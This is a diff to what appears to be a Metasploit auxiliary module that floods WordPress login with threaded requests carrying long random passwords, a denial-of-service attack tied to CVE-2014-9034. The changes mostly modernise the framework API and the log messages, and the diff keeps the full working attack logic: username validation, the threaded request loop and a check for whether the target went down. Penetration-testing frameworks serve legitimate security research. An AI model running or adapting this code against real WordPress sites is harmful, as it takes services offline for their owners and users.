@@ -1,12 +1,10 @@
 ##
-# This module requires Metasploit: http://www.metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-  include Msf::HTTP::Wordpress
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
@@ -20,12 +18,13 @@ class Metasploit3 < Msf::Auxiliary
       'License'         => MSF_LICENSE,
       'Author'          =>
         [
-          'Javier Nieto Arevalo',           # Vulnerability disclosure
-          'Andres Rojas Guerrero',          # Vulnerability disclosure
-          'Rob Carr <rob[at]rastating.com>' # Metasploit module
+          'Javier Nieto Arevalo',  # Vulnerability disclosure
+          'Andres Rojas Guerrero', # Vulnerability disclosure
+          'rastating'              # Metasploit module
         ],
       'References'      =>
         [
+          ['CVE', '2014-9016'],
           ['URL', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9034'],
           ['OSVDB', '114857'],
           ['WPVDB', '7681']
@@ -41,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
         OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
         OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
         OptBool.new('VALIDATE_USER', [true, 'Validate the specified username', true])
-      ], self.class)
+      ])
   end
 
   def rlimit
@@ -71,18 +70,11 @@ class Metasploit3 < Msf::Auxiliary
   def user_exists(user)
     exists = wordpress_user_exists?(user)
     if exists
-      print_good("#{peer} - Username \"#{username}\" is valid")
-      report_auth_info(
-        :host => rhost,
-        :sname => (ssl ? 'https' : 'http'),
-        :user => user,
-        :port => rport,
-        :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
-      )
-
+      print_good("Username \"#{username}\" is valid")
+      store_valid_credential(user: user, private: nil, proof: "WEBAPP=\"Wordpress\", VHOST=#{vhost}")
       return true
     else
-      print_error("#{peer} - \"#{user}\" is not a valid username")
+      print_error("\"#{user}\" is not a valid username")
       return false
     end
   end
@@ -90,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     if wordpress_and_online?
       if validate_user
-        print_status("#{peer} - Checking if user \"#{username}\" exists...")
+        print_status("Checking if user \"#{username}\" exists...")
         unless user_exists(username)
           print_error('Aborting operation - a valid username must be specified')
           return
@@ -100,7 +92,7 @@ class Metasploit3 < Msf::Auxiliary
       starting_thread = 1
       while starting_thread < rlimit do
         ubound = [rlimit - (starting_thread - 1), thread_count].min
-        print_status("#{peer} - Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
+        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
 
         threads = []
         1.upto(ubound) do |i|
@@ -108,20 +100,20 @@ class Metasploit3 < Msf::Auxiliary
             begin
               wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
             rescue => e
-              print_error("#{peer} - Timed out during request #{(starting_thread - 1) + i}")
+              print_error("Timed out during request #{(starting_thread - 1) + i}")
             end
           end
         end
 
         threads.each(&:join)
-        print_good("#{peer} - Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
+        print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
         starting_thread += ubound
       end
 
       if wordpress_and_online?
-        print_error("#{peer} - FAILED: #{target_uri} appears to still be online")
+        print_error("FAILED: #{target_uri} appears to still be online")
       else
-        print_good("#{peer} - SUCCESS: #{target_uri} appears to be down")
+        print_good("SUCCESS: #{target_uri} appears to be down")
       end
     else
       print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
